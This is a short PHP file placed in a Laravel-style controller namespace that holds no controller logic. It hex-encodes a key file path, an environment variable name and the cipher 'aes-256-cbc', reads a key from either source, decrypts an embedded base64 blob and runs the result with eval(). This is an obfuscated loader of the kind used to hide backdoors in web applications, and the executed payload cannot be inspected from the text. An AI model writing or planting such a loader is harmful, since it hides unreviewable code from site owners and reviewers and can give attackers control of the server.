<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('DvNn+ZyNydfZeCPAhfMbig==');

$c=base64_decode(

'0G1xe3c8bPeSalbZpLsQ8qc6Ucem0lMnYTgeAP1HLSIJh2xQPkWhcnLrrHVgicCdRgU3o3Ibl9PR' .
'htnTYkZQwZT+ZCVFA9l/mzNVgodBOJOE6Ayg+Pi0V33bOFrByBisH4P1G5QcpCJvJuhHYr8+KJX9' .
'xQZWNUXWpFlSxygrFCq7/pBG4dQyXmAFIA32cy7OP3enlhv7zb5cUMD28nbfDlRbXeHQ6b9MyBCA' .
'PE32Z1xtCWI/K9Loa+vKz3eWEBLU'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

